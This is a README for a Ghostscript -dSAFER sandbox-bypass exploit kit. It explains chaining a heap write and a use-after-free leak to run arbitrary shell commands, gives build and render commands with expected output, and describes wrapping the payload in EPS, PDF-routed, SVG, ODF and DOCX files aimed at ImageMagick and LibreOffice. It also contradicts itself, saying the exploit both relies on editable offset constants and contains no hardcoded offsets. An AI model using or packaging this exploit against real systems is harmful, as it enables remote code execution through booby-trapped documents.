# Ghostscript -dSAFER Bypass and Command Execution PoC

A crafted PostScript program defeats the `-dSAFER` sandbox and runs an
attacker-chosen shell command when Ghostscript renders it. The exploit chains a
Type 5 shading out-of-bounds heap write with a procedure-stream use-after-free
information leak. The leak defeats ASLR and locates Ghostscript's SAFER
path-control state in memory; the write flips that state to inactive; then the
program opens a `%pipe%` stream to run the command.

## Layout

```text
build_payload.py       Generate the core PostScript exploit (.ps)
package_payloads.py    Wrap the exploit in delivery sinks (EPS, EPT, PDF-routed, SVG, ODF, DOCX)
payloads/              Generated payload files
REPORT.md              Full bug writeup and analysis
```

## Quickstart

Generate the core PostScript exploit for a chosen command:

```bash
python3 build_payload.py --cmd 'id>/tmp/gs_proof'
```

Render it with Ghostscript on a standard headless raster device:

```bash
rm -f /tmp/gs_proof
gs -q -dSAFER -dBATCH -dNOPAUSE -sDEVICE=pbmraw -r10 -g60x60 -o /dev/null payloads/poc.ps
```

Confirm the command ran inside the sandboxed process:

```bash
cat /tmp/gs_proof
```

Expected output:

```text
uid=1000(user) gid=1000(user) groups=1000(user),...
```

## Delivery sinks

`package_payloads.py` wraps the same exploit in the container and extension
formats used by Ghostscript front ends. Generate all of them at once:

```bash
python3 package_payloads.py all --cmd 'id>/tmp/gs_proof'
```

or a single sink, for example the EPS that office suites and ImageMagick feed to
Ghostscript:

```bash
python3 package_payloads.py eps --cmd 'id>/tmp/gs_proof'
gs -q -dSAFER -dBATCH -dNOPAUSE -sDEVICE=pbmraw -r10 -g60x60 -o /dev/null payloads/payload.eps
```

The `pdf`, EPT/image-extension, and SVG bundle sinks are routing formats for
ImageMagick/Ghostscript delegates. They are not honest PDF/JPEG/PNG/GIF image
encodings.

## Requirements

Ghostscript with a standard raster device (`pbmraw`, `ppmraw`, `pnggray`, ...).
The shading decomposition that carries the write primitive is elided on
`nullpage`/`bbox`/`pdfwrite`, so the PoC must be rendered to a raster device.
The exploit targets system Ghostscript 10.02.1 on x86-64 Linux. The ABI/layout
constants live in the `layout` dict in `build_payload.py` and can be edited to
retarget another build.

## Tested environments

The PoC tries to be environment-agnostic and contains no hardcoded offsets.
This allows us to use the same test file across a fairly wide range of Ghostscript
deployements, as seen in the following table:

| Image | gs | ImageMagick | gs-raster | convert-default | convert-monochrome | convert-density-150 | libreoffice |
|---|---|---|---|---|---|---|---|
| alpine:latest | 10.07.1 | 7.1.2-24 Q16-HDRI | yes | no | no | no | yes |
| archlinux:latest | 10.07.1 | 7.1.2-25 Q16-HDRI | yes | yes | yes | yes | yes |
| debian:bookworm | 10.00.0 | 6.9.11-60 Q16 | yes | no (policy) | no (policy) | no (policy) | yes |
| debian:trixie | 10.05.1 | 7.1.1-43 Q16 | yes | yes | yes | yes | yes |
| fedora:latest | 10.06.0 | 7.1.2-13 Q16-HDRI | yes | yes | yes | yes | yes |
| ubuntu:24.04 | 10.02.1 | 6.9.12-98 Q16 | yes | yes | yes | yes | yes |
